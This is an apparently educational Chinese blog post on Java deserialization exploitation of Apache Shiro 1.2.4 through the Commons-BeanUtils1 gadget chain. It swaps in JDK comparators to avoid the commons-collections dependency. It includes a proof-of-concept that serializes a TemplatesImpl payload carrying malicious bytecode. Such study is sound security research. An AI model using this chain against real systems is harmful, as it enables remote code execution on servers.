# 前言

继续《Java安全漫谈》的学习。



# 预备知识



之前学习了Commons-BeanUtils1的反序列化链，之所以会学习这个链子，也提到了是因为shiro依赖了它。

写个pom.xml的dependency（不用commons-collections）：

```xml
  <dependencies>
    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-core</artifactId>
      <version>1.2.4</version>
    </dependency>
    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-web</artifactId>
      <version>1.2.4</version>
    </dependency>

    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>javax.servlet-api</artifactId>
      <version>3.1.0</version>
      <scope>provided</scope>
    </dependency>

    <dependency>
      <groupId>javax.servlet.jsp</groupId>
      <artifactId>jsp-api</artifactId>
      <version>2.2</version>
      <scope>provided</scope>
    </dependency>



    <!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->
    <dependency>
      <groupId>commons-logging</groupId>
      <artifactId>commons-logging</artifactId>
      <version>1.2</version>
    </dependency>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-api</artifactId>
      <version>1.7.30</version>
    </dependency>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-simple</artifactId>
      <version>1.7.30</version>
    </dependency>


  </dependencies>
```



用maven构建一下就会发现，`shiro-core`中就依赖了`commons-beanutils`：

![image-20210830093126675]([Java反序列化]Shiro反序列化学习(二).assets/image-20210830093126675.png)

因此很自然的联想到，利用commons-beanutils的链子去攻击shiro，实现不利用commons-collections依赖。



正常的攻击会出现两个问题，第一个问题就是`serialVersionUID`的问题，很容易去想，如果两个依赖的版本不同，里面的类的`serialVersionUID`有可能不同，导致反序列化失败。解决办法就是修改所依赖包的版本，去适应反序列化攻击的服务上的依赖版本即可。



第二个问题就是这个报错：

> Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.



发现明明没有利用到commons-collections，但是却要去找cc中的`ComparableComparator`类，导致了反序列化失败。找一下就会发现，原来是`BeanComparator`类出了问题：

```java
import org.apache.commons.collections.comparators.ComparableComparator;
public class BeanComparator implements Comparator, Serializable {
    public BeanComparator( String property ) {
        this( property, ComparableComparator.getInstance() );
    }
```

如果产生`BeanComparator`对象的时候没有设置`comparator`的话，默认是设置成`ComparableComparator()`类，导致了依赖commons-collections。



但是这个`comparator`其实用处不大：

```java
    public int compare( Object o1, Object o2 ) {
        
        if ( property == null ) {
            // compare the actual objects
            return comparator.compare( o1, o2 );
        }
        
        try {
            Object value1 = PropertyUtils.getProperty( o1, property );
            Object value2 = PropertyUtils.getProperty( o2, property );
            return comparator.compare( value1, value2 );
        }
```

就单纯的利用shiro上来说，只要它不是默认的`ComparableComparator`即可。

说简单点就是：

1. `implements Comparator`
2. `implements Serializable`
3. Java、shiro或commons-beanutils自带，不依赖额外的包。

P神还提了一个兼容性强，也确实，但其实小一点来说就是，只要满足上面三点，不管兼容性咋样都能利用成功。



经过师傅们的寻找，比如这个`CaseInsensitiveComparator`类比较满足：

```java
    private static class CaseInsensitiveComparator
            implements Comparator<String>, java.io.Serializable {
        // use serialVersionUID from JDK 1.2.2 for interoperability
        private static final long serialVersionUID = 8575799808933029326L;
```



是`String`类中的静态类。通过获取`String`的`CASE_INSENSITIVE_ORDER`属性即可得到：

```java
    public static final Comparator<String> CASE_INSENSITIVE_ORDER
                                         = new CaseInsensitiveComparator();
```



尝试构造POC即可。



# POC

构造一波，单纯的`BeanComparator`那里改一下就可以了：

```java
        byte[] evilCode = SerializeUtil.getEvilCode();
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilCode});
        SerializeUtil.setFieldValue(templates,"_name","feng");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator("outputProperties",String.CASE_INSENSITIVE_ORDER);

        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);


        SerializeUtil.setFieldValue(priorityQueue,"queue",new Object[]{templates,templates});
        SerializeUtil.setFieldValue(priorityQueue,"size",2);
        byte[] bytes = SerializeUtil.serialize(priorityQueue);
        return bytes;
```

即可攻击成功：

![image-20210830094545442]([Java反序列化]Shiro反序列化学习(二).assets/image-20210830094545442.png)



此外`private static class ReverseComparator`类同样可以：

```java
BeanComparator beanComparator = new BeanComparator("outputProperties", Collections.reverseOrder());

    public static <T> Comparator<T> reverseOrder() {
        return (Comparator<T>) ReverseComparator.REVERSE_ORDER;
    }

        static final ReverseComparator REVERSE_ORDER
            = new ReverseComparator();
```





